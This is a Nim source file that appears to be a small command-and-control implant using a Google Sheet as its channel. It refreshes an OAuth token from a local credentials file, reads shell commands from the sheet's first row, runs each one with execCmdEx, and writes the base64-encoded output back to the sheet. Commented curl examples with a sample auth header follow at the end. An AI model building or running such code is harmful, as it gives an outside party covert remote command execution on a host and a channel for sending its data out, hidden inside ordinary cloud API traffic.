import std/httpclient
import std/json
import std/base64
# import typetraits
import std/osproc
import std/strutils

var clientID = parseJson(readfile("clientID"))["web"]
var key = clientID["client_id"].getStr() & ":" & clientID[
        "client_secret"].getStr()
key = encode(key)
var DOCID = "1fBZ9-BB09fuIIFY2coe68B-QWZaDGr8El2ISEdr28M0"



# Get ACCESS_TOKEN using refresh token
let authClient = newHttpClient()
authClient.headers = newHttpHeaders({"Content-Type": "application/x-www-form-urlencoded",
        "Authorization": "Basic " & key})
var ACCESS_TOKEN = ""
try:
    var res = authClient.postContent("https://oauth2.googleapis.com/token?access_type=offline&prompt=consent",
            body = "grant_type=refresh_token&refresh_token=" & clientID[
            "refresh_token"].getStr())
    var resJson = parseJson(res)
    ACCESS_TOKEN = resJson["access_token"].getStr()
finally:
    authClient.close()


# get document
let client = newHttpClient()

client.headers = newHttpHeaders({"Authorization": "Bearer " & ACCESS_TOKEN,
        "Accept": "application/json"})
var resDoc2: JsonNode
try:
    var resDoc = client.getContent("https://sheets.googleapis.com/v4/spreadsheets/" &
            DOCID & "?fields=sheets.data.rowData.values(formattedValue)&ranges=Sheet1")
    resDoc2 = parseJson(resDoc)
finally:
    client.close()

var resContent = (resDoc2["sheets"][0]["data"][0]["rowData"][0][
        "values"]).getElems()




# put results of the commands
for i in 0..(resContent.len - 1):
    var execVar = execCmdEx(resContent[i]["formattedValue"].getStr())
    let putclient = newHttpClient()
    putclient.headers = newHttpHeaders({"Authorization": "Bearer " & ACCESS_TOKEN, "Accept": "application/json","Content-Type": "application/json"})
    echo resContent[i]["formattedValue"].getStr()
    echo execVar.output
    var finalURL = "https://sheets.googleapis.com/v4/spreadsheets/" & DOCID & "/values/E" & intToStr(i+1) & "?valueInputOption=USER_ENTERED"
    var finalbody = """{"values":[["""" & encode(execVar.output) & """"]]}"""
    echo finalURL
    echo finalbody
    try:
        var rescomn = putclient.putContent(finalURL, body=finalbody)
    finally:
        putclient.close()


# 











# API token
# client credential grant type
# curl -H "Content-Type: application/x-www-form-urlencoded" \
#   -H "Authorization: Basic c3FIOG9vSGV4VHo4QzAyg5T1JvNnJoZ3ExaVNyQWw6WjRsanRKZG5lQk9qUE1BVQ" \
#   -X POST "https://apitest.acme.com/oauth/token" \
#   -d "grant_type=client_credentials"

# doc manipulation
# curl --request POST \
#   'https://docs.googleapis.com/v1/documents?key=[YOUR_API_KEY]' \
#   --header 'Authorization: Bearer [YOUR_ACCESS_TOKEN]' \
#   --header 'Accept: application/json' \
#   --header 'Content-Type: application/json' \
#   --data '{"title":"nice"}' \
#   --compressed

# curl \
#   'https://docs.googleapis.com/v1/documents/[DOCUMENTID]?key=[YOUR_API_KEY]' \
#   --header 'Authorization: Bearer [YOUR_ACCESS_TOKEN]' \
#   --header 'Accept: application/json' \
#   --compressed
